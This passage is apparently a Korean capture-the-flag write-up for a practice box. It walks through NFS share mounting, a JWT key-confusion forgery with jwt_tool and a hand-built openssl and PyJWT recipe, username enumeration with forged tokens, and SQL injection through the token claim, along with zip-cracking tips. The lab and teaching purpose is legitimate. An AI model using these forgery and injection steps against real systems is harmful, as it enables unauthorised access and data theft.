> zip 엔트리는 보통 **deflate로 압축한 뒤 암호화**한다. 그래서 bkcrack에 넘길 known-plaintext는 원본 파일이 아니라 **동일한 deflate 스트림**이어야 한다. bkcrack에 딸린 `tools/deflate.py`가 그 변환을 한다.
> 엔트리가 `Stored`(무압축)라면 원본 파일을 그대로 주면 된다. `unzip -v`의 `Method` 컬럼으로 확인한다.

> [!tip] 암호 걸린 zip을 만났을 때의 판단 분기
> ```
> unzip -v backup.zip            # 암호화 여부(*)와 압축 방식 확인
> 7z l -slt backup.zip           # Method 가 ZipCrypto 인가 AES-256 인가
> ```
> - **AES-256** → known-plaintext 불가. `zip2john` + `john`/`hashcat -m 13600` 사전공격만 남는다
> - **ZipCrypto** + 내용물 중 하나를 알거나 추측 가능 → **bkcrack** (몇 초~몇 분)
> - **ZipCrypto** + 아무것도 모름 → 사전공격(`-m 17225`), 또는 **아카이브 안에 표준 파일이 있는지** 본다. `bootstrap.min.css`·`jquery.min.js`처럼 인터넷에서 동일 바이트를 구할 수 있는 파일이 있으면 그게 곧 known-plaintext다
>
> **이 박스는 마지막 힌트가 그대로 정답이다.** `backup.zip`에는 부트스트랩·mobirise 자산이 잔뜩 들어 있었으므로, NFS 공개키가 없었더라도 `bootstrap.min.css`로 같은 공격이 가능했을 것이다. `[가정]` — 버전이 정확히 일치해야 하므로 실제로는 시도가 필요하다.

---

## 3. Foothold

### 3-1. NFS 마운트

```bash
┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ mkdir -p /tmp/nfs

┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ sudo mount -t nfs 192.168.248.222:/mnt/share /tmp/nfs -o nolock

┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ ls -al /tmp/nfs
total 8
drwxrwxrwx  3 nobody nogroup 4096 Jul 18  2022 .
drwxrwxrwt 26 root   root     580 Aug 19 15:05 ..
drwxr-xr-x  2 root   root    4096 Jul 18  2022 essentials
```

**플래그 해설:**

| 플래그 | 역할 | 빼면 |
|---|---|---|
| `-t nfs` | 파일시스템 타입 지정. v3/v4 자동 협상 | 타입 추론 실패로 마운트 거부되는 경우가 있다 |
| `-o nolock` | **NLM(파일 잠금) 사용 안 함**. lockd는 별도 포트(여기선 33527/32877)를 쓰고, **클라이언트로 되돌아오는 콜백 연결**이 필요하다 | VPN·방화벽 환경에서 마운트가 **수십 초 멈췄다가 실패**한다. PG/HTB 같은 VPN 환경에서는 사실상 필수 |
| `-o vers=3` | 강제로 NFSv3 사용 (필요 시) | v4 협상이 실패하면 붙지 않는다. `showmount`가 되는데 mount가 안 되면 이걸 붙여본다 |
| `-o ro` | 읽기 전용 마운트 | 실수로 원본을 건드릴 위험. **증거 보존이 중요하면 붙여라** |

> [!danger] 반증됨 — `drwxrwxrwx nobody nogroup`은 **`root_squash`의 증거가 아니다**
> "`drwxrwxrwx nobody nogroup` — `root_squash`가 작동 중인 증거다. 서버상 `root` 소유인 디렉터리가 클라이언트에서 `nobody`로 보인다"고 읽기 쉽다. **인과가 틀렸다.**
> `root_squash`는 **클라이언트가 보내는 UID 0 요청을 `anonuid`(기본 65534)로 강등**하는 서버측 접근 통제다. **서버에 있는 파일의 표시 소유자를 바꾸는 기능이 아니다.**
> 결정적 반증이 **같은 `ls` 출력 안에** 있다 — 바로 아랫줄의 `essentials`는 `root root`로 보인다. 같은 마운트인데 부모 디렉터리만 `nobody`로 뒤집힐 이유가 없다. 즉 이 표시는 **서버측 실제 소유권**이고, `/mnt/share`가 진짜로 `nobody:nogroup` 777로 만들어져 있는 것이다.
> **`root_squash` 여부를 판정하는 확실한 근거는 `/etc/exports`뿐이다.** 이 박스에서는 셸을 잡은 뒤 4-1절에서 `/mnt/share *(rw,sync,no_subtree_check)`를 확인했고, `no_root_squash`가 **없으므로** 기본값 `root_squash`가 적용된다. **결론(`no_root_squash`가 아니다)은 옳았다 — 근거만 틀렸다.**
> 셸을 잡기 전에 실증하려면 **직접 써 보면 된다**:
> ```bash
> sudo touch /tmp/nfs/probe && ls -lan /tmp/nfs/probe
> #  UID 0 으로 기록되면      → no_root_squash
> #  UID 65534(nobody) 이면   → root_squash
> ```
> (쓰기 권한이 없으면 이 시험 자체가 안 되므로, 그때는 셸을 잡을 때까지 판정을 보류한다.)

### 3-2. 얻은 것은 공개키 한 장

```bash
┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ cd /tmp/nfs/essentials

┌──(kali㉿kali)-[/tmp/nfs/essentials]
└─$ ls
public.key

┌──(kali㉿kali)-[/tmp/nfs/essentials]
└─$ cat public.key
-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA3dFqq0OaPITIrCHAN86q
GYIbNAJYlyodym1PNrklp0pD0ddhit7omVeVY6JYq+BDHaMgS6mBr20ecAf7oBUA
CAKgnAkZpUtUY0p5JMe5jEUbVVnZylwawiJP8MsU+F+vRf3UDSiJIRAff+rajdxb
dubApQakRdy4HfxMFTUGJEDm91YpjHCpLXslXub5pWZtA+4QeKzWCMO70PwWcEYA
Yv0Gif0yR4hGKm5ugI2KzCT1CbJAE++ZHryR0oMHjFIEPwFjDqdcQk0Z+nuDlmJL
vQdA2Y7O6k7OJLXbRvDH97+L4ouPcxj2gS+x25mlFBmiMZUXnj/ZqD2DGz5Yq+hB
f4DRAALZAv5zsN2uiPjU98IAm4jdqTw+yUxUkdX5bDomPF1jFvdWygsY8Yo5J3pk
xWhMvULam5kfs1Cu+RHR3fu9m7xi7QILkWVyOd8B0qfixtpGE20o6/VhuAS9rPBH
AMih9//ztpKStW0NNhtfYfsl9xenqt1E9GVr3js/OUYIcC4ZOLZT4ulluL0gAGWu
niDUq1os9iR2HzYBNOwlw77bipjACB0mxZE7WE2fQEtLnQ/K5yDQTQM4tr3r8X6L
RTAP0iwG56rcYiQtmM/shSocenRr228os666rQwFnxT7jugl0sRlsFqZNzgXWDn/
51qez+VrhIb63VuDyVKewPcCAwEAAQ==
-----END PUBLIC KEY-----
```

**공개키다.** 개인키가 아니다. 여기서 "쓸모없다"고 판단하면 박스가 끝난다.

키 자체를 확인한다.

```bash
┌──(kali㉿kali)-[/tmp/nfs/essentials]
└─$ openssl rsa -pubin -in public.key -text -noout | head -3
Public-Key: (4096 bit)
Modulus:
    00:dd:d1:6a:ab:43:9a:3c:84:c8:ac:21:c0:37:ce:
    ┌──(kali㉿kali)-[/tmp/nfs/essentials]
└─$ ssh-keygen -f public.key -e -m PKCS8 2>/dev/null | head

```

**4096비트 RSA 공개키**임이 확정된다. 두 번째 명령(`ssh-keygen -e`)은 **빈 출력으로 실패**했다 — 이유는 6장에 정리한다.

> [!tip] 공개키를 주웠을 때의 사고 순서
> 1. **JWT를 쓰는 앱인가?** → `alg` 혼동(RS256→HS256) 후보. **이 박스의 정답**
> 2. **SSH `authorized_keys`용인가?** → 대응하는 개인키를 찾아야 한다. 공개키 단독으로는 로그인 못 한다
> 3. **키 길이가 짧거나(≤1024) 특이한 modulus인가?** → 인수분해(`RsaCtfTool`, FactorDB) 후보
> 4. **다른 곳에서 같은 파일을 만날 수 있는가?** → **known-plaintext 재료**. 이 박스의 두 번째 정답
>
> 4번은 잘 안 떠오르는 발상이다. **"이 파일의 평문을 내가 안다"는 사실 자체가 무기가 되는 상황**을 기억해 둬라.

### 3-3. 로그인 — Content-Type 하나가 성패를 가른다

```bash
┌──(kali㉿kali)-[/tmp/nfs/essentials]
└─$ curl -i -X POST http://scarlet.local/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}'
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 19 Aug 2026 06:10:33 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 69
Connection: keep-alive
X-Powered-By: Express
Location: /login?error=Invalid%20username%20or%20password
Vary: Accept

Found. Redirecting to /login?error=Invalid%20username%20or%20password                                 
```

`X-Powered-By: Express` — **Node.js/Express 확정**. `/routes/`·`/middleware/` 디렉터리 추정과 일치한다(**독립 근거 2개**).

두 번째 시도에서 **자격증명과 Content-Type을 동시에 바꿔** 성공했다.

```bash
┌──(kali㉿kali)-[/tmp/nfs/essentials]
└─$ curl -i -X POST http://scarlet.local/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=4leaf&password=password1"
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 19 Aug 2026 06:11:06 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 29
Connection: keep-alive
X-Powered-By: Express
Set-Cookie: session=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjRsZWFmIiwiaWF0IjoxNzg3MTE5ODY2fQ.CAOSvdGhpsxp6RTMguLf5wrRDsZWA-ewNHuGHW2D66Tat-sJiXl_jbJ2Wd7du_mW-GskiayTlG3FYhtm2wN5TKpavfDeHgFdJs91spCHXaUVP5TPFijeWKvI2Cf3Xf967xZP6PyjWInXB_jxVo_xGV3lM_Q_fMfbBUSQq0tKayJQgVkPVEsPmEvF-U1GRE0bj__ijqTXyrJXVv0HkXylB6g9-Gm_ersY5WKZgsRlVsnh42a550JmWguWzc6zX82lY1g7pfjOKuW7Iez5yP2DMr1v9R5kpelycbOaeNMUOpewXrUwHOV7fBtwZJEAmLosD27vW9xU_WwWd9k35oujrKovIesaMadGQ2KHPvvRyiR4HudvjRk-HLESZrFKQCY7LE-meuEiI8zvWaFTGJtAyCNkWk8CLEYCjmhtpqG8N_tqdUFWIMgyCszj8A2JedMVVMnt5LD7jHqw3Y7ki3fUEmSAwJnmZSFlCR8HZjVYVeL4b5w9MGeI5BXolhi6_RPOQPxeCT6jC5CZJmfz6KdSj8bEON5HN3Gk8It_AFQBokbxO95VFZpCdx2bySWfOX8BKIg1JRZiE-rsbwEXNGnh8ZhkBqkzJsXQ4PUOuABYsxxkpptjPrpH-xzq5nsqFzGcSHRIa2KgYZ_xQp59e3y7xYBHbLjqrsBwl_4gv__VRoo; Max-Age=900; Path=/; Expires=Wed, 19 Aug 2026 06:26:06 GMT
Location: /portal
Vary: Accept

Found. Redirecting to /portal      
```

`Location: /portal` — **로그인 성공.** 세션 쿠키가 곧 JWT다.

토큰의 앞 두 조각을 디코드하면 재료가 전부 보인다:

```bash
# 헤더
echo 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9' | base64 -d
{"alg":"RS256","typ":"JWT"}

# 페이로드
echo 'eyJ1c2VybmFtZSI6IjRsZWFmIiwiaWF0IjoxNzg3MTE5ODY2fQ' | base64 -d
{"username":"4leaf","iat":1787119866}
```

**`alg: RS256` + `NFS에서 주운 공개키`.** 이 두 줄이 만나는 순간 2-2절의 공격이 성립한다.

> [!warning] **`4leaf:password1`의 출처가 원문에 없다**
> 이 자격증명이 어디서 나왔는지 기록이 없다. `[가정]` 웹사이트 본문(Mobirise 템플릿의 팀/연락처 섹션)이나 로그인 페이지 안내문에서 얻었을 가능성이 높다. 나중에 SQLi로 덤프한 `users` 테이블에 `4leaf:password1`이 실제로 존재하므로 **추측 성공이 아니라 어딘가에서 읽은 값**이다.
> **시험 교훈: 자격증명을 얻은 경로는 반드시 그 자리에서 메모하라.** 리버트 후 재현할 때 이 한 줄이 없으면 처음부터 다시 뒤져야 한다.

> [!note] `Max-Age=900` — 15분 만료
> 토큰 유효기간이 짧다. **위조 토큰에는 이 제약이 적용되지 않는다**(`exp` 클레임이 없고 `iat`만 있으므로 서버가 만료를 검사하지 않는다). 실제로 이 박스에서는 최초 발급 토큰의 `iat=1787119866`을 계속 재사용해도 통했다.
> 반대로 `exp`가 있는 앱이라면 **위조할 때 `exp`도 미래로 밀어야** 한다.

### 3-4. 키 혼동 공격으로 토큰 위조

먼저 공격이 성립하는지부터 확인한다(`-T`는 대화형 tamper 모드).

```bash
┌──(kali㉿kali)-[~/git/jwt_tool]
└─$  python jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjRsZWFmIiwiaWF0IjoxNzg3MTE5ODY2fQ.CAOSvdGhpsxp6RTMguLf5wrRDsZWA-ewNHuGHW2D66Tat-sJiXl_jbJ2Wd7du_mW-GskiayTlG3FYhtm2wN5TKpavfDeHgFdJs91spCHXaUVP5TPFijeWKvI2Cf3Xf967xZP6PyjWInXB_jxVo_xGV3lM_Q_fMfbBUSQq0tKayJQgVkPVEsPmEvF-U1GRE0bj__ijqTXyrJXVv0HkXylB6g9-Gm_ersY5WKZgsRlVsnh42a550JmWguWzc6zX82lY1g7pfjOKuW7Iez5yP2DMr1v9R5kpelycbOaeNMUOpewXrUwHOV7fBtwZJEAmLosD27vW9xU_WwWd9k35oujrKovIesaMadGQ2KHPvvRyiR4HudvjRk-HLESZrFKQCY7LE-meuEiI8zvWaFTGJtAyCNkWk8CLEYCjmhtpqG8N_tqdUFWIMgyCszj8A2JedMVVMnt5LD7jHqw3Y7ki3fUEmSAwJnmZSFlCR8HZjVYVeL4b5w9MGeI5BXolhi6_RPOQPxeCT6jC5CZJmfz6KdSj8bEON5HN3Gk8It_AFQBokbxO95VFZpCdx2bySWfOX8BKIg1JRZiE-rsbwEXNGnh8ZhkBqkzJsXQ4PUOuABYsxxkpptjPrpH-xzq5nsqFzGcSHRIa2KgYZ_xQp59e3y7xYBHbLjqrsBwl_4gv__VRoo -X k -pk /tmp/nfs/essentials/public.key -T
 ... (배너 중략) ...
/home/kali/.jwt_tool/jwtconf.ini
Original JWT:


====================================================================
This option allows you to tamper with the header, contents and
signature of the JWT.
====================================================================

Token header values:
[1] alg = "RS256"
[2] typ = "JWT"
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] username = "4leaf"
[2] iat = 1787119866    ==> TIMESTAMP = 2026-08-19 15:11:06 (UTC)
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[5] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0
File loaded: /tmp/nfs/essentials/public.key
jwttool_6cbb3756e7e57b0c3afe455ed7fabbad - EXPLOIT: Key-Confusion attack (signing using the Public Key as the HMAC secret)
(This will only be valid on unpatched implementations of JWT.)
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjRsZWFmIiwiaWF0IjoxNzg3MTE5ODY2fQ.1t8YpvMp8bRijEzMb_ihIr-pKy2zciVb4jJzUDmUckA
```

> [!warning] jwt_tool이 붙인 `(UTC)` 라벨은 **실제로는 로컬 시각(KST)이다**
> 출력의 `iat = 1787119866 ==> TIMESTAMP = 2026-08-19 15:11:06 (UTC)` — **1787119866의 UTC는 `06:11:06`**이고 `15:11:06`은 KST(UTC+9)다.
> 이 노트 안에 대조 근거가 있다 — 그 토큰을 발급한 응답 헤더가 `Date: Wed, 19 Aug 2026 06:11:06 GMT`(3-3절)다. **두 값이 같은 순간을 가리키므로 `06:11:06`이 맞고, jwt_tool의 라벨이 틀렸다.**
> 원인은 파이썬 `datetime.fromtimestamp()`(로컬 시간대 변환)를 쓰고 라벨만 `UTC`로 찍는 것으로 보인다 `[가정]`. **위 원문 출력은 그대로 보존했다** — 도구가 실제로 그렇게 찍은 것이 사실이기 때문이다.
> **실전 의미: 토큰 시각을 서버 로그·응답 헤더와 대조할 때 9시간이 어긋난다.** 직접 환산해서 확인하라 — `date -u -d @1787119866`.

**플래그 해설:**

| 플래그 | 의미 |
|---|---|
| `-X k` | **Key-confusion 공격 수행** (`k` = key confusion). `-X a`는 `alg:none`, `-X s`는 서명 제거 |
| `-pk <파일>` | 공개키 파일 지정. **이것이 HMAC 비밀키로 쓰인다** |
| `-T` | 대화형 tamper 모드 — 헤더/페이로드를 눈으로 보며 수정 |
| `-I -pc <키> -pv <값>` | 비대화형 클레임 주입. `-pc`=payload claim, `-pv`=payload value. **스크립트에 넣으려면 이쪽** |

생성된 토큰의 헤더가 `HS256`으로 바뀌었다:

```bash
echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9' | base64 -d
{"alg":"HS256","typ":"JWT"}
```

서버가 이 토큰을 받는지 확인한다 — **`/portal`이 302가 아니라 200을 내면 성공**이다.

```bash
┌──(kali㉿kali)-[/tmp/nfs/essentials]
└─$ curl -i http://scarlet.local/portal \
  -H "Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjRsZWFmIiwiaWF0IjoxNzg3MTE5ODY2fQ.1t8YpvMp8bRijEzMb_ihIr-pKy2zciVb4jJzUDmUckA"
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 19 Aug 2026 06:16:15 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 6070
Connection: keep-alive
X-Powered-By: Express
ETag: W/"17b6-S2iOoyef+QZxV0gETUqPAzQUxqk"

<!DOCTYPE html>
<html  >
<head>
  <!-- Site made with Mobirise Website Builder v5.6.5, https://mobirise.com -->
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="generator" content="Mobirise v5.6.5, mobirise.com">
  <meta name="twitter:card" content="summary_large_image"/>
  <meta name="twitter:image:src" content="">
  <meta property="og:image" content="">
  <meta name="twitter:title" content="Page 1">
  <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
  <link rel="shortcut icon" href="assets/images/mbr.png" type="image/x-icon">
  <meta name="description" content="">


  <title>Scarlet - Portal</title>
```

**`200 OK` + `Scarlet - Portal`. 키 혼동 공격이 성립했다.** 이 시점부터 `username` 클레임은 완전히 통제된다.

> [!danger] ⚠️ 시험 대비 — **jwt_tool 없이 손으로 위조하기**
> jwt_tool은 금지 도구는 아니지만(자동 익스플로잇이 아니다) **시험장 Kali에 깔려 있지 않을 수 있다.** `openssl`만으로 되는 절차를 반드시 익혀둬라:
> ```bash
> KEY=/tmp/nfs/essentials/public.key
> b64() { openssl base64 -A | tr '+/' '-_' | tr -d '='; }   # base64url, 패딩 제거
>
> H=$(printf '%s' '{"alg":"HS256","typ":"JWT"}' | b64)
> P=$(printf '%s' '{"username":"admin","iat":1787119866}' | b64)
>
> # 공개키 파일 "바이트 그대로"를 HMAC 비밀키로 쓴다  ← -mac HMAC -macopt hexkey:
> SIG=$(printf '%s' "$H.$P" \
>   | openssl dgst -sha256 -mac HMAC -macopt hexkey:$(xxd -p -c 999 "$KEY") -binary \
>   | b64)
>
> echo "$H.$P.$SIG"
> ```
> **함정 셋:**
> 1. **base64url이다.** `+`→`-`, `/`→`_`, `=` 패딩 제거. 일반 base64를 쓰면 서명이 안 맞는다
> 2. **비밀키는 파일의 원시 바이트**다. PEM 텍스트를 base64 디코드한 DER가 아니라 **PEM 파일 그 자체**를 쓴다(구현에 따라 다르므로 **둘 다 시도**한다)
> 3. **트레일링 개행**. `xxd -p` 결과 끝에 `0a`가 있는지 확인하고, 실패하면 개행을 뺀 버전도 시도한다
>
> 파이썬이 있으면 훨씬 짧다:
> ```python
> import jwt   # PyJWT
> pub = open('/tmp/nfs/essentials/public.key','rb').read()
> print(jwt.encode({"username":"admin","iat":1787119866}, pub, algorithm="HS256"))
> ```

### 3-5. 사용자 열거 — 위조 토큰을 열거 오라클로 쓴다

`admin`으로 위조한 토큰은 만들어졌지만, **`admin`이라는 사용자가 DB에 없었다.**

```bash
┌──(kali㉿kali)-[~/git/jwt_tool]
└─$  python jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjRsZWFmIiwiaWF0IjoxNzg3MTE5ODY2fQ.CAOSvdGhpsxp6RTMguLf5wrRDsZWA-ewNHuGHW2D66Tat-sJiXl_jbJ2Wd7du_mW-GskiayTlG3FYhtm2wN5TKpavfDeHgFdJs91spCHXaUVP5TPFijeWKvI2Cf3Xf967xZP6PyjWInXB_jxVo_xGV3lM_Q_fMfbBUSQq0tKayJQgVkPVEsPmEvF-U1GRE0bj__ijqTXyrJXVv0HkXylB6g9-Gm_ersY5WKZgsRlVsnh42a550JmWguWzc6zX82lY1g7pfjOKuW7Iez5yP2DMr1v9R5kpelycbOaeNMUOpewXrUwHOV7fBtwZJEAmLosD27vW9xU_WwWd9k35oujrKovIesaMadGQ2KHPvvRyiR4HudvjRk-HLESZrFKQCY7LE-meuEiI8zvWaFTGJtAyCNkWk8CLEYCjmhtpqG8N_tqdUFWIMgyCszj8A2JedMVVMnt5LD7jHqw3Y7ki3fUEmSAwJnmZSFlCR8HZjVYVeL4b5w9MGeI5BXolhi6_RPOQPxeCT6jC5CZJmfz6KdSj8bEON5HN3Gk8It_AFQBokbxO95VFZpCdx2bySWfOX8BKIg1JRZiE-rsbwEXNGnh8ZhkBqkzJsXQ4PUOuABYsxxkpptjPrpH-xzq5nsqFzGcSHRIa2KgYZ_xQp59e3y7xYBHbLjqrsBwl_4gv__VRoo -X k -pk /tmp/nfs/essentials/public.key -I -pc username -pv admin
 ... (배너 중략) ...
/home/kali/.jwt_tool/jwtconf.ini
Original JWT:

File loaded: /tmp/nfs/essentials/public.key
jwttool_2335501e4e6161b37d7c73791d092605 - EXPLOIT: Key-Confusion attack (signing using the Public Key as the HMAC secret)
(This will only be valid on unpatched implementations of JWT.)
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzg3MTE5ODY2fQ.DHdnhNtQCIa6E51K9N6cGsXefSrJQkXWqr9c4cb34aA
```

포털이 존재하지 않는 사용자에 대해 **`doesn't exist`** 를 응답한다는 사실이 곧 **사용자 열거 오라클**이다. 웹사이트에 실려 있던 사람 이름을 후보로 만들어 자동 순회했다.

```bash
┌──(kali㉿kali)-[/tmp/nfs/essentials]
└─$ #!/bin/bash
ORIG="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjRsZWFmIiwiaWF0IjoxNzg3MTE5ODY2fQ.CAOSvdGhpsxp6RTMguLf5wrRDsZWA-ewNHuGHW2D66Tat-sJiXl_jbJ2Wd7du_mW-GskiayTlG3FYhtm2wN5TKpavfDeHgFdJs91spCHXaUVP5TPFijeWKvI2Cf3Xf967xZP6PyjWInXB_jxVo_xGV3lM_Q_fMfbBUSQq0tKayJQgVkPVEsPmEvF-U1GRE0bj__ijqTXyrJXVv0HkXylB6g9-Gm_ersY5WKZgsRlVsnh42a550JmWguWzc6zX82lY1g7pfjOKuW7Iez5yP2DMr1v9R5kpelycbOaeNMUOpewXrUwHOV7fBtwZJEAmLosD27vW9xU_WwWd9k35oujrKovIesaMadGQ2KHPvvRyiR4HudvjRk-HLESZrFKQCY7LE-meuEiI8zvWaFTGJtAyCNkWk8CLEYCjmhtpqG8N_tqdUFWIMgyCszj8A2JedMVVMnt5LD7jHqw3Y7ki3fUEmSAwJnmZSFlCR8HZjVYVeL4b5w9MGeI5BXolhi6_RPOQPxeCT6jC5CZJmfz6KdSj8bEON5HN3Gk8It_AFQBokbxO95VFZpCdx2bySWfOX8BKIg1JRZiE-rsbwEXNGnh8ZhkBqkzJsXQ4PUOuABYsxxkpptjPrpH-xzq5nsqFzGcSHRIa2KgYZ_xQp59e3y7xYBHbLjqrsBwl_4gv__VRoo"
for u in brian.harper brianharper bharper brian harper b.harper brian_harper brianh will.johnson willjohnson wjohnson austin.carter acarter; do
  TOKEN=$(python /home/kali/git/jwt_tool/jwt_tool.py "$ORIG" -X k -pk /tmp/nfs/essentials/public.key -I -pc username -pv "$u" 2>/dev/null | grep -oP '(?<=\[\+\] )ey[A-Za-z0-9._-]+')
  RESP=$(curl -s http://scarlet.local/portal -H "Cookie: session=$TOKEN")
  if ! echo "$RESP" | grep -q "doesn't exist"; then
    echo "[+] VALID: $u"
  else
    echo "[-] $u"
  fi
done
[-] brian.harper
[-] brianharper
[-] bharper
[+] VALID: brian
[-] harper
[-] b.harper
[-] brian_harper
[-] brianh
[-] will.johnson
[-] willjohnson
[-] wjohnson
[-] austin.carter
[-] acarter
```

`[가정]` `brian.harper` / `will.johnson` / `austin.carter`는 원문에 출처가 없다. **웹사이트 본문(팀 소개 섹션)에서 뽑은 이름**으로 보인다 — Mobirise 템플릿 사이트의 전형이다.

**결과: `brian` 하나만 존재한다.** 이름 변형 12개 중 가장 단순한 형태가 답이었다.

> [!tip] 사용자명 변형 생성은 기계적으로 하라
> 사람 이름 `First Last`를 얻으면 최소 이 8가지를 만든다:
> `first` · `last` · `first.last` · `firstlast` · `flast` · `f.last` · `first_last` · `firstl`
> 자동화: `username-anarchy -i names.txt` 또는
> ```bash
> awk '{f=tolower($1);l=tolower($2); print f; print l; print f"."l; print f l; print substr(f,1,1) l; print substr(f,1,1)"."l; print f"_"l; print f substr(l,1,1)}' names.txt | sort -u
> ```

**하지만 `brian` 토큰으로 포털을 열어도 변동사항이 없었다.** 관리 기능도, 새 정보도 없다. **여기서 "인증 우회는 성공했지만 얻은 게 없다"는 막다른 길에 부딪힌다.** 다음 수는 6장에 정리한다.

### 3-6. SQL 인젝션 확인

`username` 클레임에 작은따옴표 하나를 넣는다.

```bash
┌──(kali㉿kali)-[~/git/jwt_tool]
└─$ ORIG="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjRsZWFmIiwiaWF0IjoxNzg3MTE5ODY2fQ.CAOSvdGhpsxp6RTMguLf5wrRDsZWA-ewNHuGHW2D66Tat-sJiXl_jbJ2Wd7du_mW-GskiayTlG3FYhtm2wN5TKpavfDeHgFdJs91spCHXaUVP5TPFijeWKvI2Cf3Xf967xZP6PyjWInXB_jxVo_xGV3lM_Q_fMfbBUSQq0tKayJQgVkPVEsPmEvF-U1GRE0bj__ijqTXyrJXVv0HkXylB6g9-Gm_ersY5WKZgsRlVsnh42a550JmWguWzc6zX82lY1g7pfjOKuW7Iez5yP2DMr1v9R5kpelycbOaeNMUOpewXrUwHOV7fBtwZJEAmLosD27vW9xU_WwWd9k35oujrKovIesaMadGQ2KHPvvRyiR4HudvjRk-HLESZrFKQCY7LE-meuEiI8zvWaFTGJtAyCNkWk8CLEYCjmhtpqG8N_tqdUFWIMgyCszj8A2JedMVVMnt5LD7jHqw3Y7ki3fUEmSAwJnmZSFlCR8HZjVYVeL4b5w9MGeI5BXolhi6_RPOQPxeCT6jC5CZJmfz6KdSj8bEON5HN3Gk8It_AFQBokbxO95VFZpCdx2bySWfOX8BKIg1JRZiE-rsbwEXNGnh8ZhkBqkzJsXQ4PUOuABYsxxkpptjPrpH-xzq5nsqFzGcSHRIa2KgYZ_xQp59e3y7xYBHbLjqrsBwl_4gv__VRoo"

┌──(kali㉿kali)-[~/git/jwt_tool]
└─$ python jwt_tool.py "$ORIG" -X k -pk /tmp/nfs/essentials/public.key -I -pc username -pv "brian'"
 ... (배너 중략) ...
/home/kali/.jwt_tool/jwtconf.ini
Original JWT:

File loaded: /tmp/nfs/essentials/public.key
jwttool_4b7e45322c4a8c1369bbc897802941d9 - EXPLOIT: Key-Confusion attack (signing using the Public Key as the HMAC secret)
(This will only be valid on unpatched implementations of JWT.)
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImJyaWFuJyIsImlhdCI6MTc4NzExOTg2Nn0.dtHpmGbUz1bqiGIEA0JRFMQoR6YDwrxQzuVMiCK5idI

┌──(kali㉿kali)-[~/git/jwt_tool]
└─$ curl -s http://scarlet.local/portal -H "Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImJyaWFuJyIsImlhdCI6MTc4NzExOTg2Nn0.dtHpmGbUz1bqiGIEA0JRFMQoR6YDwrxQzuVMiCK5idI"
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Error: SQLITE_ERROR: unrecognized token: "'brian''"</pre>
</body>
</html>
```

**SQLi 확정.** 그리고 2-3절에서 정리했듯 이 한 줄이 DBMS·인용 방식·에러 반사 여부를 전부 알려준다.

### 3-7. 수동 UNION SQLi로 덤프

> [!danger] ⚠️ **sqlmap은 시험 금지다 — 그리고 여기서는 애초에 쓸 수 없다**
> sqlmap은 파라미터를 변조하지만, **여기서는 변조할 때마다 JWT를 재서명해야 한다.** sqlmap 단독으로는 불가능하고 `--eval` 훅이나 프록시 스크립트가 필요하다.
> **이 박스는 처음부터 끝까지 수동 UNION으로 풀렸다.** 아래 스크립트는 "자동 익스플로잇 도구"가 아니라 **수동 페이로드를 반복 전송하는 래퍼**다 — 시험에서 허용되는 형태이고, 그대로 가져다 쓸 수 있는 템플릿이다.

```bash
┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ cat scarlet_all.sh
#!/bin/bash
# scarlet_all.sh — JWT key-confusion SQLi 전자동 덤프
